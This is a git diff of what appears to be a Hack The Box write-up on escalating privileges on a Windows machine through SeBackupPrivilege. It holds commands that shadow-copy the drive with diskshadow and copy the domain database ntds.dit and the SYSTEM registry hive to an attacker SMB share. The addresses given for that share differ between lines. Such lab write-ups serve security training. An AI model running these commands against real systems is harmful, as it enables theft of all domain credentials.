@@ -145,9 +145,9 @@ Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
 
 ```
 https://pentestlab.blog/tag/diskshadow/
+unix2dos vss.dsh
 upload vss.dsh c:\programdata\vss.dsh
 diskshadow /s c:\programdata\vss.dsh
-unix2dos vss.dsh
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/6d7f6af1-934b-4279-b5eb-e8c788d625b4)
 
@@ -170,6 +170,7 @@ expose %df% z:
 ./smbserver.py s . -smb2support -username df -password df
 net use \\10.10.14.13\s /u:df df
 Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.13\s\ntds.dit
+Copy-FileSeBackupPrivilege z:\Windows\system32\config\SYSTEM \\10.10.14.6\s\SYSTEM
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/ace2cfb7-7a8e-45dd-a6f7-0d9962f32d5b)
 
